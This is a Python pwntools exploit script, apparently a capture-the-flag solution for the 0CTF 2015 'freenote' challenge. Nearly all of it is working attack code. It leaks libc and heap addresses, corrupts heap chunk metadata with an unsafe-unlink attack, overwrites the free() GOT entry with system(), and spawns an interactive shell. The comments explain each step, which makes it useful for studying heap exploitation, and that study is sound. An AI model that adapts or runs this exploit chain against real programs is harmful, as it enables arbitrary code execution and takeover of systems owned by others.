#
# 0CTF 2015 pwn freenote
#

from pwn import *

r = process('./freenote-')

b = ELF('./freenote-')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = b.arch
context.log_level = 'info'

def new_note(s):
    r.send('2\n')
    r.sendafter('Length of new note:', str(len(s))+'\n')
    r.sendafter('Enter your note:', s)

def delete_note(n):
    r.send('4\n')
    r.sendafter('Note number:', str(n)+'\n')

def edit_note(num,len,data):
    r.send('3\n')
    r.send(str(num)+'\n')
    r.send(str(len)+'\n')
    r.send(data)

#
# 1 free() -> fd & bk pointer points <main_arena>
#
def leak_libc():
    r.send('1\n')
    r.recvuntil('CCCCCCCC')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l) 
    
    while len(l) < 8:
        l = l + '\x00'

    l = u64(l)
    log.info('leaked libc: 0x%x' % l)
    return l

#
# 2 free()s -> 
# the 1st free chunk -> fd points the 2nd free chunk (bk points <main_arena>)
# the 2nd free chunk -> bk points the 1st free chunk (fd points <main_arena>)
#
# we are going to leak this bk pointer.
#
def leak_heap():
    r.send('1\n')
    r.recvuntil('DDDDDDDD')
    l = r.recvuntil('\n')
    l = l[:len(l)-1]
    print hexdump(l)

    while len(l) < 8:
        l = l + '\x00'

    l = u64(l)
    log.info('leaked heap: 0x%x' % l)
    return l

if __name__ == "__main__":

    #
    # 'freenote' has two critical vulnerabilities.
    #
    # 1) it does not append trailing NULL when it reads string from stdin.
    # 2) you can free() already freed chunks.
    #
    # exploit strategy will be
    #
    # 1) alloc & free 3 chunks
    # 2) alloc carefully crafted memory overlapping with already free'ed memory region. 
    #    (thus overwriting the metadata)
    # 3) free the chunk again 
    #

    #
    # NOTE_TABLE
    #
    # ------------------------
    # [HEADER]
    # ------------------------
    #   [TABLE SIZE, 256]
    #   [COUNT, 0 ~ 256]
    # ------------------------
    # [DATA]
    # ------------------------
    #   [OCCUPIED FLAG, 0 or 1]
    #   [NOTE SIZE, 0 ~ 4096]
    #   [PTR TO CHUNK]
    #
    #   [OCCUPIED FLAG, 0 or 1]
    #   [NOTE SIZE, 0 ~ 4096]
    #   [PTR TO CHUNK]
    #   ...
    #

    r.recvuntil('Your choice:')

    new_note(p32(0xdeadbeef)) # alloc two chunks and delete the first one
    new_note(p32(0xdeadbeef))

    delete_note(0) # glibc malloc manager will write fd/bk pointers into the chunk which point somewhere in libc area

    new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
    
    leaked_libc = leak_libc() 
    libc_base = leaked_libc - (0x7f8f01ab8b78 - 0x7f8f016f4000) # ugly, need refactoring.

    delete_note(0)
    delete_note(1)
    
    for _ in xrange(4):
        new_note(p32(0xcafebabe))

    #
    # don't free adjacent chunks!!! it will cause heap coalescing.
    # we need two free chunks pointing each other
    #

    delete_note(2) # basically, the order is not important.
    delete_note(0)
    
    new_note('D'*8)
    leaked_heap = leak_heap()
    
    delete_note(0)
    delete_note(1)
    delete_note(3)

    #
    # Step 1)
    #
    # prepare heap feng shui suitable for "unsafe_unlink" technique (refer shellphish's how2heap)
    #

    new_note('A'*0x80)
    new_note('B'*0x80)
    new_note('C'*0x80)
    
    delete_note(0)
    delete_note(1)
    delete_note(2)

    #
    # Step 2)
    #
    # Land the carefully crafted one big chunk which will overwrite the metadata of already free chunks
    #
    # What will happen:
    #
    # 1) free( note_1 ) will cause coalescing (take note_0 off a free list and merge with note_1)
    # 2)  -> unlink( note_0 ) ( to take note_0 off )
    # 3)      -> FD = note_0->fd
    #         -> BK = note_0->bk
    #         -> FD->bk = BK
    #         -> BK->fd = FD
    #
    # Invariants: unlink( AV, P, BK, FD )
    # 
    # FD->bk == P && BK->fd == P
    # 

    target = leaked_heap - 6128 # target is note0->ptr

    log.info('target address: 0x%x' % target)
    log.info('chunk_0: 0x%x' % leaked_heap)
    log.info('chunk_1: 0x%x' % (leaked_heap+16+0x80))

    chunk_0 = p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32)
    chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80                  # prev_size = 0x80, PREV_INUSE = 0
    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80                     # PREV_INUSE = 1

    payload_len = len(chunk_0 + chunk_1 + chunk_2)
    new_note(chunk_0 + chunk_1 + chunk_2)

    raw_input('after overwriting metadata...')

    log.info('trying to free 0x%x...' % (leaked_heap+16+0x80+16))
    raw_input('before free...')

    #
    # Step 3)
    # 
    # doing free() a chunk which has corrupted metadata will do classic 'FD->bk = BK' memory write.
    # By using this write primitive, we can make [PTR TO CHUNK] pointing itself (to be pricise, -24).
    # With [PTR TO CHUNK] which points itself, we can overwrite [PTR TO CHUNK] to point GOT by edit_note().
    # With [PTR TO CHUNK] which points GOT, doing edit_note() again will end this misery.
    #

    delete_note(1)

    raw_input('after deleting note_1...')

    # delete_note(1) makes target points to itself (to be precise, -24 bytes)
    #
    # since, note0->ptr points &note0->ptr-24, we need to prefix (3-qword)
    # entire payload size should be same, or realloc() will break the entire exploit sequence apart
    #
    # [COUNT 1] [OCCUPIED YES] [NOTE SIZE 8] [PTR to CHUNK]
    edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(b.got['free']) + 'x'*(payload_len-32))

    raw_input('after editing note_0->ptr to 0x602018...')

    edit_note(0,8, p64(libc_base+libc.symbols['system']))       # now aligned (no need to add 3-qword prefix)

    raw_input('after editing note_0->ptr to system()...')

    new_note('sh\x00')

    raw_input('after new note /bin/sh...')
    
    r.clean()
    r.send('1\n')
    print r.recv()

    delete_note(17) # needs refactoring. add '/bin/sh' first. recalc offset.

    r.interactive()
